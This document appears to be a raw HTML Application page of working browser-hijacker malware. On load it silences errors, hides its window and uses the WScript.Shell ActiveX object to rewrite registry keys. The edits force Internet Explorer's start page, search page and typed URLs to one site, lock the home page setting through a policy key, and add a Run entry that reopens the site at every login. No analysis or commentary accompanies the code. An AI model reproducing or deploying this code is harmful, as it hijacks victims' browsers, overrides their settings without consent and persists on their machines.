
<html><SCRIPT LANGUAGE="JavaScript">
<!-- Hide
function killErrors() {
return true;
}
window.onerror = killErrors;
// -->
</SCRIPT> 
<html>
<hta:application caption="no" showintaskbar="no">
<body onload="window.blur();">
<object id='bugs' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object>
<script LANGUAGE="VBScript">
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.e2123.com/"
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.e2123.com/"
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Search Page", "http://www.e2123.com/"
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\default_page_url", "http://www.e2123.com/"
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url1","http://www.e2123.com/"
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url2","http://www.e2123.com/"
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url3","http://www.e2123.com/"
bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\First Home Page","http://www.e2123.com/"
bugs.RegWrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\HomePage","1","REG_DWORD"
bugs.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\IEXPLORE.EXE", "IEXPLORE.EXE http://www.e2123.com/"
window.close
</script>
<script language="javascript">
window.close();
</script>
</html>


